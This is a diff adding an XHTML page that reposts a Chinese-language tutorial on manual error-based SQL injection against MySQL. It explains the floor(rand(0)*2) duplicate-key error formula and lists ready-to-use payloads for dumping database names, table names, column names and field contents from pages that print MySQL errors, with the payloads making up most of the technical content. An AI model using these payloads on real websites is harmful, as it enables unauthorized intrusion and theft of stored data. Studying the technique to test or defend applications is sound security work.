@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>mysql报错注入手工方法</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>mysql报错注入手工方法</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&amp;mid=2247484213&amp;idx=1&amp;sn=2893698fc7dd4c23b64e9f6335591387&amp;chksm=f9e06c6ece97e578c3a9d9018b0187589c279a8ac35e352142f0482857f5c8d290068ed27dc5&amp;scene=126&amp;sessionid=1681663522#rd">http://mp.weixin.qq.com/s?__biz=MzUyMTA0MjQ4NA==&amp;mid=2247484213&amp;idx=1&amp;sn=2893698fc7dd4c23b64e9f6335591387&amp;chksm=f9e06c6ece97e578c3a9d9018b0187589c279a8ac35e352142f0482857f5c8d290068ed27dc5&amp;scene=126&amp;sessionid=1681663522#rd</a></blockquote><br/><p>以前觉得报错注入有那么一长串，还有各种concat(),rand()之类的函数，不方便记忆和使用，一直没怎么仔细的学习过。这次专门学习了一下，看了一些大牛的总结，得到一些经验，特此记录下来，以备后续巩固复习。<br/><br/> <br/><br/>总体来说，报错注入其实是一种公式化的注入方法，主要用于在页面中没有显示位，但是用echo mysql_error();输出了错误信息时使用。<br/><br/>公式具体如下<br/><br/>and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)<br/><br/>我们在这个语句中其实已经可以看到了普通注入的影子，第五个select子句的version()处显示了数据库使用的版本，后面的information_schema.tables显示的就是我们在mysql中对应的系统表信息，第三个子句的limit用于控制遍历数据库的每一条记录。<br/><br/>注意的是，我们一般手工注入使用limit时，都是使用limit 0,1;limit,1,2;limit 2,3……这种模式去依次遍历数据库的每个项目。<br/><br/>但是要注意这里的遍历方式需要调整：变成了limit 0,1;limit1,1;limit 2,1……这种形式<br/><br/> <br/><br/>搞清楚了语句的公式，剩下的注入过程就跟我们普通的注入很像了，只需要调整语句对应的结构即可：<br/><br/>汇总如下：<br/><br/>1、暴数据库：<br/><br/>and(select 1 from(select count(*),concat((select (select (select concat(0x7e,schema_name,0x7e))) from information_schema.schemata  limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)<br/><br/> <br/><br/>2、暴数据表：<br/><br/>and(select 1 from(select count(*),concat((select (select (select concat(0x7e,table_name,0x7e))) from information_schema.tables where table_schema=库名的十六进制  limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)<br/><br/> <br/><br/>3、暴列名：<br/><br/>and(select 1 from(select count(*),concat((select (select (select concat(0x7e,column_name,0x7e))) from information_schema.columns where table_schema=0x7365637572697479 and table_name=0x7573657273 limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)<br/><br/> <br/><br/>4、暴字段：<br/><br/>and(select 1 from(select count(*),concat((select (select (select concat(0x7e,字段名,0x7e))) from 库名.表名 limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)<br/><br/>总结起来，就是一套已经成型的公式，然后用普通注入的方法进行注入就好了</p>
+        
+</body>
+</html>
